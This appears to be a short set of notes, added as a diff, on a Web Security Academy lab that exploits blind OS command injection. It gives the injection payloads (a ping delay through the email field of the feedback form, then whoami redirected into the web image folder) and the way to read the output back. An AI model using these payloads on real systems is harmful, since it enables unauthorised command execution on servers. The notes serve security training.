@@ -1,0 +1,12 @@
+url : https://xxxxxxxx.web-security-academy.net
+Vulnerable url : https://xxxxxxx.web-security-academy.net/feedback
+Image url: https://xxxxxxx.web-security-academy.net/image?filename=output.txt
+attack type: blind OS injection
+confirm: response `& ping -c 10 127.0.0.1 #` payload
+steps: {
+  1. Identify in-band or blind, blind
+  2. Check where images stored, /var/www/images 
+  3. identify vulnerable input field, email
+  4. craft payload, whoami > /var/www/images/output.txt
+  5. Change filename to output.txt, /image?filename=output.txt 
+}
